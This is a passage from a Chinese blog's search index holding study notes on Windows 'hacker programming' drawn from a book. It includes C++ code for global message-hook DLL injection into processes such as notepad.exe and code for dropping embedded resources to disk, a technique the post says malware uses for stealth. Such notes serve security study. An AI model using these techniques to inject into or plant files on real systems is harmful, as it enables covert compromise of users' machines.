class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// test.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span><br><span class="hljs-comment">//</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">BOOL</span><span class="hljs-params">(*typedef_SetGlobalHook)</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">BOOL</span><span class="hljs-params">(*typedef_UnsetGlobalHook)</span><span class="hljs-params">()</span></span>;<br>HMODULE hDll = <span class="hljs-literal">NULL</span>;<br>typedef_SetGlobalHook SetGlobalHook = <span class="hljs-literal">NULL</span>;<br>typedef_UnsetGlobalHook UnsetGlobalHook = <span class="hljs-literal">NULL</span>;<br>BOOL bRet = FALSE;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;按下回车开始设置钩子\n&quot;</span>);<br><span class="hljs-built_in">getchar</span>();<br><span class="hljs-keyword">do</span><br>&#123;<br>hDll = <span class="hljs-built_in">LoadLibrary</span>(<span class="hljs-string">L&quot;Hook.dll&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == hDll)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;加载DLL失败\n错误代码%d\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br><span class="hljs-keyword">break</span>;<br>&#125;<br>SetGlobalHook = (typedef_SetGlobalHook)<span class="hljs-built_in">GetProcAddress</span>(hDll, <span class="hljs-string">&quot;SetGlobalHook&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == SetGlobalHook)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取函数地址失败\n错误代码%d\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br><span class="hljs-keyword">break</span>;<br>&#125;<br>bRet = <span class="hljs-built_in">SetGlobalHook</span>();<br><span class="hljs-keyword">if</span> (bRet)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;设置钩子成功\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;设置钩子失败\n&quot;</span>);<br>&#125;<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>UnsetGlobalHook = (typedef_UnsetGlobalHook)<span class="hljs-built_in">GetProcAddress</span>(hDll, <span class="hljs-string">&quot;UnsetGlobalHook&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == UnsetGlobalHook)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取函数地址失败\n错误代码%d\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-built_in">UnsetGlobalHook</span>();<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;卸载钩子成功\n&quot;</span>);<br>&#125; <span class="hljs-keyword">while</span> (FALSE);<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="效果查看"><a href="#效果查看" class="headerlink" title="效果查看"></a>效果查看</h4><p>可以先试用PC hunter工具进行查看，可以看到当前没有任何消息钩子存在。</p><p><img src="/2021/07/08/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E5%85%A8%E5%B1%80%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/1.png"></p><p>打开我们的test.exe，设置好钩子之后，再进行查看，刷新一下消息钩子列表，如图可以看到已经存在了一个消息钩子。</p><p><img src="/2021/07/08/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E5%85%A8%E5%B1%80%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/2.png"></p><p>使用OD附加打开notepad.exe，再打开模块窗口。</p><p><img src="/2021/07/08/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E5%85%A8%E5%B1%80%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/3.png"></p><p>再打开test.exe，进行钩子设置。可以很明显看到变化，已经注入成功了。</p><p><img src="/2021/07/08/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E5%85%A8%E5%B1%80%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/4.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>注入</tag>
      
      <tag>HOOK</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>资源释放</title>
    <link href="/2021/07/08/%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/"/>
    <url>/2021/07/08/%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/</url>
    
    <content type="html"><![CDATA[<h2 id="资源释放"><a href="#资源释放" class="headerlink" title="资源释放"></a>资源释放</h2><p>恶意代码会广泛的使用此技术，因为它可以使程序变得简洁，提高隐蔽性。如果一个程序需要额外的加载一些DLL、文本文件或者其他类型文件，将它们可以作为资源插入到程序中，在程序运行的时候再将它们释放到本地上，这样恶意代码会更加隐蔽。</p><h4 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h4><h5 id="FindResource函数，确定具有指定类型和名称的资源在指定模块中的位置"><a href="#FindResource函数，确定具有指定类型和名称的资源在指定模块中的位置" class="headerlink" title="FindResource函数，确定具有指定类型和名称的资源在指定模块中的位置"></a>FindResource函数，确定具有指定类型和名称的资源在指定模块中的位置</h5><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apl">HRSRC FindResourceW(<br>  HMODULE hModule,<br>  LPCWSTR lpName,<br>  LPCWSTR lpType<br>);<br></code></pre></div></td></tr></table></figure><p>hModule：处理包含资源的可执行文件模块。若hModule为NULL，则系统从当前进程的模块中装载资源。</p><p>lpName：指定资源名称</p><p>lpType：指定资源类型</p><p>返回值：如果函数运行成功，那么返回值为指定资源信息块的句柄。可将这个句柄传递给其它函数获取其他信息。如果失败，则返回NULL；</p><h5 id="SizeofResource函数：获取指定资源的字节数"><a href="#SizeofResource函数：获取指定资源的字节数" class="headerlink" title="SizeofResource函数：获取指定资源的字节数"></a>SizeofResource函数：获取指定资源的字节数</h5><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apl">DWORD SizeofResource(<br>  HMODULE hModule,<br>  HRSRC   hResInfo<br>);<br></code></pre></div></td></tr></table></figure><p>hModule：包含资源的可执行文件模块的句柄。若hModule为NULL，则系统从当前进程的模块中装载资源。</p><p>hResInfo：资源局部。此句柄必须由函数FindResource或FindResourceEx来出创建。</p><p>返回值：如果函数运行成功，则返回值为资源的字节数；如果函数运行失败，则返回值为0；</p><h5 id="LoadResource函数：装载指定资源到全局存储器"><a href="#LoadResource函数：装载指定资源到全局存储器" class="headerlink" title="LoadResource函数：装载指定资源到全局存储器"></a>LoadResource函数：装载指定资源到全局存储器</h5><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apl">HGLOBAL LoadResource(<br>  HMODULE hModule,<br>  HRSRC   hResInfo<br>);<br></code></pre></div></td></tr></table></figure><p>hModule：包含资源的可执行文件模块的句柄。若hModule为NULL，则系统从当前进程的模块中装载资源。</p><p>hResInfo：资源局部。此句柄必须由函数FindResource或FindResourceEx来出创建。</p><p>返回值：如果函数运行成功，则返回值为相关资源数据的句柄。如果函数运行失败，则返回值为NULL。</p><h5 id="LockResource函数：锁定资源并得到资源在内存中的第一个字节的指针"><a href="#LockResource函数：锁定资源并得到资源在内存中的第一个字节的指针" class="headerlink" title="LockResource函数：锁定资源并得到资源在内存中的第一个字节的指针"></a>LockResource函数：锁定资源并得到资源在内存中的第一个字节的指针</h5><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apl">LPVOID LockResource(<br>  HGLOBAL hResData<br>);<br></code></pre></div></td></tr></table></figure><p>hResData：装载资源的句柄。函数LoadResource可以返回这个句柄。</p><p>返回值：如果装载资源被锁住，则返回值是资源的第一个字节的指针；反之则为NULL。</p><h4 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h4><p>创建一个test.txt文件，写入内容</p><p><img src="/2021/07/08/%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/1.png"></p><p>在程序中添加一个自定义资源，自定义资源名称为“MYRES”，再将刚才创建的txt文件添加进去</p><p>程序实现源代码</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// FreeRes.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span><br><span class="hljs-comment">//</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;resource.h&quot;</span></span><br><span class="hljs-comment">//资源控件名称，资源名称，释放后的名称</span><br><span class="hljs-function">BOOL <span class="hljs-title">FreeRes</span><span class="hljs-params">(UINT uiResourceName,TCHAR* lpszResType,<span class="hljs-keyword">char</span>* lpszSaveFileName)</span> </span>&#123;<br>    <span class="hljs-comment">//获取指定模块的资源</span><br>    HRSRC hRes = <span class="hljs-built_in">FindResource</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-built_in">MAKEINTRESOURCE</span>(uiResourceName), lpszResType);<br>    <span class="hljs-keyword">if</span> (hRes == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;获取资源失败&quot;</span>, <span class="hljs-string">L&quot;&quot;</span>, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">//获取大小</span><br>    DWORD dwSize = <span class="hljs-built_in">SizeofResource</span>(<span class="hljs-literal">NULL</span>, hRes);<br>    <span class="hljs-keyword">if</span> (dwSize == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;获取字节数失败&quot;</span>, <span class="hljs-string">L&quot;&quot;</span>, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">//装载资源</span><br>    HGLOBAL hGlobal = <span class="hljs-built_in">LoadResource</span>(<span class="hljs-literal">NULL</span>, hRes);<br>    <span class="hljs-keyword">if</span> (hGlobal == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;装载资源失败&quot;</span>, <span class="hljs-string">L&quot;&quot;</span>, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">//锁定资源</span><br>    LPVOID lPvoid = <span class="hljs-built_in">LockResource</span>(hGlobal);<br>    <span class="hljs-keyword">if</span>(lPvoid == <span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;锁定资源失败&quot;</span>, <span class="hljs-string">L&quot;&quot;</span>, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">//开始释放资源</span><br>    FILE* fp;<br>    <span class="hljs-built_in">fopen_s</span>(&amp;fp, lpszSaveFileName, <span class="hljs-string">&quot;wb+&quot;</span>);<span class="hljs-comment">//wb+读写打开或建立一个二进制文件，允许读和写</span><br>    <span class="hljs-keyword">if</span> (fp == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;写入资源失败&quot;</span>, <span class="hljs-string">L&quot;&quot;</span>, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-built_in">fwrite</span>(lPvoid, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(<span class="hljs-keyword">char</span>), dwSize, fp);<br>    <span class="hljs-built_in">fclose</span>(fp);<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;按下回车键开始释放资源\n&quot;</span>);<br>    <span class="hljs-built_in">getchar</span>();<br>    BOOL FLAG=<span class="hljs-built_in">FreeRes</span>(IDR_MYRES2,<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;MYRES&quot;</span>),<span class="hljs-string">&quot;free.txt&quot;</span>);<br>    <span class="hljs-keyword">if</span> (FLAG == TRUE) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;释放成功\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;释放失败\n&quot;</span>);<br>    <span class="hljs-built_in">getchar</span>();<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/07/08/%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/2.png"></p><p>查看free.txt内容</p><p><img src="/2021/07/08/%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/3.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>写在前面的话</title>
    <link href="/2021/07/08/%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2%E7%9A%84%E8%AF%9D/"/>
    <url>/2021/07/08/%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2%E7%9A%84%E8%AF%9D/</url>
    
    <content type="html"><![CDATA[<p>一直都在说要写博客，但是一直都没有很好的坚持下来，上次写博客还是大二的时候，这都过去好久了。</p><p>现在自己也搭建了一个博客，希望能够好好坚持下去吧，作为日常的学习记录，也希望能够写出一些有价值的东西。</p><p>最后的最后，我是不知名小团队satter的b1ackie。</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
